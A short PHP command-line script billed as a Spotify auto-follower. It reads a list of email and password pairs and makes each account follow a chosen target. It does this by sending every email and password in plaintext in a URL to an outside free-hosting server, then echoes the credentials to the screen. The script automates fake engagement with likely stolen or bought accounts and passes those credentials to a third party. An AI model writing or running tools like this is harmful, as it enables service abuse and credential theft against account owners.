<?php
ini_set('date.timezone', 'Asia/Jakarta');
ob_implicit_flush(true);
error_reporting(0);
function in_string($s,$as) {
	$s=strtoupper($s);
	if(!is_array($as)) $as=array($as);
	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
	return false;
}
echo "============================================\n";
echo "  	Spotify Auto Follower User [Target] \n"; 
echo "               Github : Zeldriss    	\n";
echo "============================================\n";
echo "[+] List : ";
$list = trim(fgets(STDIN));
$delim = "|";
echo "[+] Target Follow : ";
$target = trim(fgets(STDIN));
echo "============================================\n";
echo "[~] Starting Follow...\n";
echo "============================================\n";

$file = file_get_contents("$list");
$data = explode("\n",$file);
$jumlah= 0; $live=0; $mati=0;
for($a=0;$a<count($data);$a++){
	$date = date("h:i:sa");
        $data1 = explode($delim,$data[$a]);
        $email = $data1[0];
        $pass = $data1[1];
	$cek = @file_get_contents("http://hadehente69.000webhostapp.com/follow/example.php?user=$email&pass=$pass&target=$target");
	if (strpos($cek,"[ true ]")) {

		echo "[" . $date . "]"; $cek = "=> SUCCESS FOLLOW"; $live+=1;
  }else{
		echo "[" . $date . "]"; $cek = "=> GAGAL FOLLOW"; $mati+=1;
	}
	ob_flush();
  print($cek.$email."|".$pass."\n");
}
	echo "============================================\n";
	print ("Success Follow! : " . count($data). "\n");
	echo "FOLLOWER SUCCESS : $live - GAGAL FOLLOW : $matiS \n";

?>
